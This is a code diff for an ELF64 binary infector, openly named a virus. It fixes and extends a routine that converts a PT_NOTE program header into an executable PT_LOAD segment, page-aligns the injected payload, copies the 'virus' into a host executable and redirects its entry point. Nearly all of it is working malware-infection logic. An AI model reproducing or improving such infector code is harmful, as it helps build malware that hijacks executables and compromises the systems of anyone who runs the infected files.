@@ -13,34 +13,20 @@ struct ElfInfo {
   Elf64_Addr original_e_entry;
   Elf64_Addr original_pt_note_file_offset;
   Elf64_Addr parasite_load_address;
+  Elf64_Xword pt_load_alignment;
   size_t pt_note_to_be_infected_idx = 0;
 };
 
-uint64_t next_32_bit_aligned_addr(uint64_t v) { return (v & ~(4 - 1)) + 4; }
 uint64_t round_up_to(uint64_t v, uint64_t alignment) {
   return (v & ~(alignment - 1)) + alignment;
 }
 
+/*
 bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
                size_t padded_virus_size, const ElfInfo& info) {
-  auto sht_entry_count = ehdr.e_shnum;
-  auto section_entry_start = &shdr;
-
-  // Extend the last section in code
-  auto last_section_in_code =
-      section_entry_start + info.last_section_idx_in_code;
-  last_section_in_code->sh_size += padded_virus_size;
-
-  // Shift all section entries back.
-  for (auto cur_entry = last_section_in_code + 1;
-       cur_entry < section_entry_start + sht_entry_count; ++cur_entry) {
-    cur_entry->sh_offset += padded_virus_size;
-    if (cur_entry->sh_addr) {
-      cur_entry->sh_addr += padded_virus_size;
-    }
-  }
   return true;
 }
+*/
 
 void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
                 const ElfInfo& info) {
@@ -48,9 +34,12 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t virus_size, uint64_t virus_offset,
   // trasforming pt_note to pt_load
   pt_note_to_be_infected->p_align = info.pt_load_alignment;
   pt_note_to_be_infected->p_vaddr = info.parasite_load_address;
+  pt_note_to_be_infected->p_paddr = info.parasite_load_address;
   pt_note_to_be_infected->p_filesz = virus_size;
   pt_note_to_be_infected->p_memsz = virus_size;
   pt_note_to_be_infected->p_offset = virus_offset;
+  pt_note_to_be_infected->p_type = PT_LOAD;
+  pt_note_to_be_infected->p_flags = PF_R + PF_X;
 }
 
 void patch_ehdr(Elf64_Ehdr& ehdr, const ElfInfo& info, uint64_t virus_offset) {
@@ -73,7 +62,7 @@ bool get_info(const Elf64_Ehdr& ehdr, const Elf64_Phdr& phdr,
     if (phdr_entry->p_type == PT_LOAD) {
       // the parasite should have a loading address avoiding all other LOAD
       // segments.
-      auto last_byte_of_segment = phdr_entry->p_vaddr + p_memsz - 1;
+      auto last_byte_of_segment = phdr_entry->p_vaddr + phdr_entry->p_memsz - 1;
       auto potential_virus_loading_addr = last_byte_of_segment + 1;
       info.parasite_load_address = vt::max(
           info.parasite_load_address,
@@ -119,7 +108,7 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // calculate the virus insertion offset. for example:
   // original_size = 25, virus_size = 4, total_host_size = 31.
   // virus offset (must be word aligned) is align_up(31 - 4) = 28;
-  const auto virus_offset = round_up_to(host_mapping.size() - virus_size, 4);
+  const auto virus_offset = round_up_to(host_mapping.size() - 4095, 4096);
   {
     auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
         host_mapping.mutable_base() + ehdr.e_phoff);
@@ -146,18 +135,18 @@ bool pt_note_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   printf("entry changed to %x\n", ehdr.e_entry);
 
   // Inject the virus.
-  memcpy(host_mapping.mutable_base() + info.parasite_file_offset,
-         parasite_mapping.base(), parasite_mapping.size());
+  memcpy(host_mapping.mutable_base() + virus_offset, parasite_mapping.base(),
+         parasite_mapping.size());
 
   return patch_parasite_and_relinquish_control(
       ehdr.e_type, info.original_e_entry, info.parasite_load_address,
       virus_offset, parasite_mapping.size(), host_mapping);
 }
 
-size_t PtNodeInfect::output_size(size_t host_size, size_t parasite_size) {
-  // file is extended with virus. On some arch the virus needs to start at word
-  // aligned address. Therefore always return 3 extra bytes.
-  return host_size + parasite_size + 3;
+size_t PtNoteInfect::output_size(size_t host_size, size_t parasite_size) {
+  // The executable offset must be page aligned. Therefore always return 4095
+  // extra bytes.
+  return host_size + parasite_size + 4095;
 }
 
 }  // namespace vt::infector
